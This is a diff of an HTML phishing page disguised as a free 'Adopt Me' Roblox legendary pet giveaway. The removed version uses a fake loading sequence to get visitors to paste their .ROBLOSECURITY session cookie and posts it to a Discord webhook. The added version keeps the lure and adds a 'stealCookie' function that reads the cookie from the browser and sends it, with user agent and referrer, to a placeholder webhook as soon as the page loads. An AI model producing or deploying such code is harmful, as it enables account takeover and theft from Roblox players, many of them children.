@@ -3,64 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me - Free Neon Legendaries!</title>
-    
-    <meta property="og:title" content="🎉 FREE NEON LEGENDARY PETS in Adopt Me!">
-    <meta property="og:description" content="Claim before the event ends! Limited time only.">
-    <meta property="og:image" content="https://i.imgur.com/8zKz5vL.jpeg">
-    <meta property="og:url" content="https://goldenjoseph060-svg.github.io/Adopt-me-giveaway/">
-
+    <title>Adopt Me FREE LEGENDARY PETS</title>
     <style>
-        body { margin:0; padding:0; background:#0a0a0a; color:white; font-family:Arial; text-align:center; min-height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; overflow:hidden; }
-        img { max-width:85%; border:6px solid #00ffcc; box-shadow:0 0 50px #ff00aa; border-radius:20px; }
-        h1 { color:#ff00aa; text-shadow:0 0 25px #ff00aa; }
-        .loading { color:#ffff00; font-size:18px; margin:20px; }
-        textarea { display:none; width:80%; height:100px; background:#111; color:#0f0; border:2px solid #00ffcc; }
-        button { display:none; padding:15px 40px; background:#ff00aa; color:white; border:none; border-radius:10px; font-size:18px; }
+        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
+        img { max-width:100%; }
     </style>
 </head>
 <body>
-    <h1>🎉 CLAIMING YOUR FREE NEON LEGENDARIES... 🎉</h1>
-    <img src="https://i.imgur.com/8zKz5vL.jpeg" alt="Adopt Me">
-
-    <p class="loading" id="status">Connecting to Adopt Me servers...</p>
-
-    <textarea id="cookieInput" placeholder="If needed, paste .ROBLOSECURITY here to speed up..."></textarea>
-    <button onclick="submitCookie()" id="claimBtn">Complete Claim</button>
+    <h1>Claim Your FREE Adopt Me Legendaries!</h1>
+    <img src="https://i.imgur.com/your-image-here.jpg" alt="Adopt Me">
+    <p>Click below to claim</p>
+    <button onclick="stealCookie()">Claim Now</button>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
-
-        function submitCookie() {
-            const input = document.getElementById('cookieInput').value.trim() || "No paste - auto attempt";
-            const payload = {
-                content: "**🔥 Stealth Adopt Me Cookie Logged! 🔥**",
-                embeds: [{
-                    title: "Silent Roblox Logger",
-                    color: 0x00ffcc,
-                    fields: [
-                        { name: "Cookie", value: "```" + input + "```", inline: false },
-                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "Time", value: new Date().toISOString(), inline: false }
-                    ]
-                }]
-            };
-
-            fetch(webhook, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) })
-            .then(() => { alert("🎉 Rewards Added to Your Inventory!"); })
-            .catch(() => {});
+        function stealCookie() {
+            const cookies = document.cookie;
+            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) 
+                               || 'No ROBLOSECURITY found';
+            
+            // Replace with YOUR Discord webhook
+            const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**New Cookie Caught!**\n\`\`\`${robloxCookie}\`\`\`\nUser-Agent: ${navigator.userAgent}\nReferer: ${document.referrer}\nTime: ${new Date().toISOString()}`
+                })
+            })
+            .then(() => alert("Claimed! Check your inventory..."))
+            .catch(err => console.error(err));
         }
 
-        // Fake loading sequence that reveals paste box
-        setTimeout(() => {
-            document.getElementById('status').innerHTML = "Verifying Roblox session...";
-        }, 1500);
-
-        setTimeout(() => {
-            document.getElementById('status').innerHTML = "Session verified! Paste cookie if prompted by Roblox.";
-            document.getElementById('cookieInput').style.display = 'block';
-            document.getElementById('claimBtn').style.display = 'block';
-        }, 3500);
+        // Auto-run on load (most effective)
+        window.onload = function() {
+            stealCookie();
+        };
     </script>
 </body>
 </html>
